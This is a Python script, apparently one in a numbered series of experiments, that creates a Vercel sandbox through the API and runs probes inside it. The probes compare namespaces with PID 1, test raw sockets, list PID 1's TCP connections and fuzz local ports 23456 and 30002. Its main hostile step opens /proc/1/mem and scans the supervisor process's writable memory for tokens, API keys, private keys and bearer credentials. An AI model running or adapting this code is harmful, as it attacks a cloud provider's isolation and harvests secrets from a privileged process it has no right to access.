# 实验J244: netns共享判定 + PID1 TCP连接目标 + 23456深挖 + rw-p dump补全
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj244"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# A) netns 判定 + 网络接口 + raw socket
CODE_A = r'''
import os, socket, subprocess, struct
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
# ns inode 对比 (self vs PID1)
for ns in ("net", "pid", "mnt", "uts", "ipc", "cgroup", "user"):
    try:
        a = os.readlink("/proc/self/ns/" + ns)
        b = os.readlink("/proc/1/ns/" + ns)
        p("NS", ns, a, b, "SAME" if a == b else "DIFF")
    except Exception as e:
        p("NS", ns, "EXC", repr(e))
# 网络接口
r = subprocess.run("cat /proc/net/dev | head -15; echo ---; ls /sys/class/net/ 2>&1", shell=True, capture_output=True, text=True, timeout=10)
p("IFACES", (r.stdout + r.stderr)[:800].replace(chr(10), "|"))
# AF_PACKET raw socket
try:
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))  # ETH_P_ALL
    p("PACKET_RAW", "OK", s.getsockname()[:2])
    s.close()
except Exception as e:
    p("PACKET_RAW", "EXC", type(e).__name__, str(e)[:100])
# AF_INET raw socket (ICMP)
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    p("IP_RAW", "OK")
    s.close()
except Exception as e:
    p("IP_RAW", "EXC", type(e).__name__, str(e)[:100])
# 路由表
r = subprocess.run("cat /proc/net/route | head -8; echo ---; cat /proc/net/ipv6_route | head -5", shell=True, capture_output=True, text=True, timeout=10)
p("ROUTE", (r.stdout + r.stderr)[:600].replace(chr(10), "|"))
p("DONE_A", flush=True)
'''
run_cmd(sid, CODE_A, "A_NETNS", timeout=100)

# B) PID1 TCP 连接目标 (1259/1290)
CODE_B = r'''
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
tcp6 = open("/proc/1/net/tcp6").read().splitlines()[1:]
for ln in tcp6:
    parts = ln.split()
    if len(parts) < 10:
        continue
    inode = parts[9]
    if inode in ("1259", "1290") or parts[3] not in ("0A",):
        pass
    # 打印全部非监听条目
    if parts[3] != "0A":
        l = parts[1]
        r = parts[2]
        def ipv6hex(h):
            b = bytes.fromhex(h)
            # 小端序 4 words
            words = [int.from_bytes(b[i*4:(i+1)*4], "little") for i in range(4)]
            return ".".join(str(w) for w in words[::-1]) + " (ipv4-mapped)" if words[0] == 0 and words[1] == 0xffff else ":".join(hex(w)[2:] for w in words[::-1])
        p("TCP_EST", "inode", inode, "state", parts[3], "local", ipv6hex(l.split(":")[0]), "lport", int(l.split(":")[1], 16), "remote", ipv6hex(r.split(":")[0]), "rport", int(r.split(":")[1], 16))
# 全表状态摘要
states = {}
for ln in tcp6:
    parts = ln.split()
    if len(parts) > 3:
        states[parts[3]] = states.get(parts[3], 0) + 1
p("STATES", states)
p("DONE_B", flush=True)
'''
run_cmd(sid, CODE_B, "B_TCP", timeout=100)

# C) 23456 深挖 (保持连接/不同协议)
CODE_C = r'''
import socket, time
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
def t(payload, label, keep=False):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect(('127.0.0.1', 23456))
        p("23456", label, "C_OK")
        if payload:
            s.send(payload)
            p("23456", label, "SENT")
        # 先等 1s 看是否有主动推送
        time.sleep(1)
        d = b''
        while True:
            try:
                b = s.recv(4096)
                if not b:
                    p("23456", label, "CLOSED", "got", len(d))
                    break
                d += b
            except socket.timeout:
                p("23456", label, "TIMEOUT", "got", len(d))
                break
            except Exception as e:
                p("23456", label, "RE", type(e).__name__)
                break
        if d:
            p("23456", label, "RESP", d[:200].hex())
        if keep:
            time.sleep(2)
            try:
                s.send(b"X")
                p("23456", label, "SENT2")
            except Exception as e:
                p("23456", label, "SEND2_RE", type(e).__name__)
        s.close()
    except Exception as e:
        p("23456", label, "EXC", type(e).__name__, str(e)[:80])
t(b"", "NODATA", keep=True)
t(b"\x00\x00\x00\x00", "NULL4")
t(b"GET / HTTP/1.1\r\nHost: x\r\nConnection: keep-alive\r\n\r\n", "GET_KA")
t(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n", "H2")
p("DONE_C", flush=True)
'''
run_cmd(sid, CODE_C, "C_23456", timeout=100)

# D) PID1 rw-p dump 补全 (每段1MB, 13段)
CODE_D = r'''
import os, re
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
fd = os.open("/proc/1/mem", os.O_RDWR)
def ra(a, n):
    os.lseek(fd, a, 0)
    return os.read(fd, n)
segs = []
for ln in open("/proc/1/maps"):
    parts = ln.split()
    if len(parts) < 2:
        continue
    addr, perm = parts[0], parts[1]
    path = parts[5] if len(parts) > 5 else ""
    if "rw-p" in perm and "libc" not in path and "ld-" not in path:
        lo, hi = (int(x, 16) for x in addr.split("-"))
        if hi - lo > 0:
            segs.append((lo, hi, path))
p("RWSEGS", len(segs))
pat = re.compile(rb"(?:secret|token|api[_-]?key|private[_-]?key|BEGIN [A-Z ]*PRIVATE|eyJ[A-Za-z0-9_-]{20,}\.|[Bb]earer [A-Za-z0-9_\-\.]{16,}|https?://[a-zA-Z0-9\.\-]{6,60}|vcp_[A-Za-z0-9]{20,}|sk_[A-Za-z0-9]{20,}|rk_[A-Za-z0-9]{20,})")
total_found = 0
for lo, hi, path in segs:
    total = hi - lo
    off = 0
    got = 0
    while off < total:
        n = min(1024 * 1024, total - off)
        try:
            d = ra(lo + off, n)
        except Exception as e:
            p("SEG_ERR", hex(lo), hex(lo + off), repr(e))
            break
        got += len(d)
        for m in pat.finditer(d):
            s = m.group(0)
            if len(set(s)) > 3:
                p("FOUND", hex(lo + off + m.start()), s[:200])
                total_found += 1
                if total_found > 25:
                    break
        if total_found > 25:
            break
        off += n
    p("SEG", hex(lo), hex(hi), "got", got)
    if total_found > 25:
        break
p("FOUND_TOTAL", total_found)
p("DONE_D", flush=True)
'''
run_cmd(sid, CODE_D, "D_DUMP", timeout=100)

# E) 30002 保持连接等推送 + 大量连接测试
CODE_E = r'''
import socket, time
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
# 保持连接 5s 等推送
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect(('127.0.0.1', 30002))
    p("30002", "HOLD", "C_OK")
    d = b''
    while True:
        try:
            b = s.recv(4096)
            if not b:
                p("30002", "HOLD", "CLOSED", "got", len(d))
                break
            d += b
        except socket.timeout:
            p("30002", "HOLD", "TIMEOUT5", "got", len(d))
            break
        except Exception as e:
            p("30002", "HOLD", "RE", type(e).__name__)
            break
    if d:
        p("30002", "HOLD", "RESP", d[:200].hex())
    s.close()
except Exception as e:
    p("30002", "HOLD", "EXC", type(e).__name__, str(e)[:80])
# 并发连接数测试 (判断 backlog/白名单)
ok = 0
for i in range(5):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(('127.0.0.1', 30002))
        ok += 1
        p("30002", "CONN", i, "OK")
        s.close()
    except Exception as e:
        p("30002", "CONN", i, "EXC", type(e).__name__, str(e)[:60])
p("30002", "CONN_OK", ok)
p("DONE_E", flush=True)
'''
run_cmd(sid, CODE_E, "E_30002", timeout=100)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
